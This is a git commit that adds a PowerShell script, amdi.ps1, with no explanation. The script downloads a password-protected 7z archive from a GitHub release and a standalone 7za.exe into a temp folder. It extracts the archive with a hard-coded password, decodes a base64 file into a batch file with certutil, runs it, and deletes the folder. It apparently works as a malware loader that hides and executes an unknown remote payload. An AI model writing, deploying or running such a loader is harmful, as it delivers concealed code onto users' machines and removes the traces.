41999d73df77617b130147ba12dac6ce1c2cce9e
Clausus Orbis <154006113+ClaususOrbis@users.noreply.github.com>
2025-11-25 19:57:30 +0600

    Add files via upload

---
+++ amdi.ps1
@@ -0,0 +1,45 @@
+# Enable TLSv1.2 for compatibility with older clients
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
+
+$DateVar = Get-Date -Format 'yyyyMMddHHmmss'
+$DownloadR = 'https://github.com/ClaususOrbis/haste/releases/download/waste/release?v=' + $DateVar
+$Download7z = 'https://claususorbis.github.io/haste/7za.exe'
+
+if (Test-Path -Path "$env:TEMP\SURNQQ") {
+	Remove-Item -Path "$env:TEMP\SURNQQ" -Recurse -Force
+}
+New-Item -Path "$env:TEMP\SURNQQ" -ItemType Directory
+
+$FilePathR = "$env:TEMP\SURNQQ\release.7z"
+$FilePath7z = "$env:TEMP\SURNQQ\7za.exe"
+$FilePathB = "$env:TEMP\SURNQQ\0.b64"
+$FilePathBat = "$env:TEMP\SURNQQ\0.bat"
+
+try {
+    Invoke-WebRequest -Uri $DownloadR -UseBasicParsing -OutFile $FilePathR
+	Invoke-WebRequest -Uri $Download7z -UseBasicParsing -OutFile $FilePath7z
+} catch {
+    Write-Error $_
+	Return
+}
+
+try {
+    $FilePath7z e -paqSWdeFR $FilePathR -o"$env:TEMP\SURNQQ\"
+} catch {
+    Write-Error $_
+	Return
+}
+
+try {
+	certutil -decode $FilePathB $FilePathBat >nul
+} catch {
+	Write-Error $_
+	Return
+}
+
+if (Test-Path $FilePathBat) {
+    Start-Process $FilePathBat -Wait
+    # $item = Get-Item -LiteralPath $FilePathBAT
+    # $item.Delete()
+	Remove-Item -Path "$env:TEMP\SURNQQ" -Recurse -Force
+}
